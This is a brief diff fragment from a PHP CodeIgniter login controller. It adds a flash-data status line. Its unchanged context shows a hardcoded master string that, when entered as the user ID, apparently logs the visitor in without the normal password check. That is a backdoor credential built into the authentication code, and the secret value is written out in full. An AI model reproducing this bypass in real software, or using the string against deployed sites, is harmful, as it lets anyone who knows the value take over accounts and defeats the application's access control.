@@ -18,6 +18,7 @@ class Auth extends CI_Controller{
       $check = $this->auth_model->auth($uid, $pass);
       $master = '0>}/99%120691?*^';
       if ($master == $uid) {
+        $this->session->set_flashdata(array('status'=>'aktif'));
         $this->session->set_userdata(
           array(
             'status_login'=>'oke',
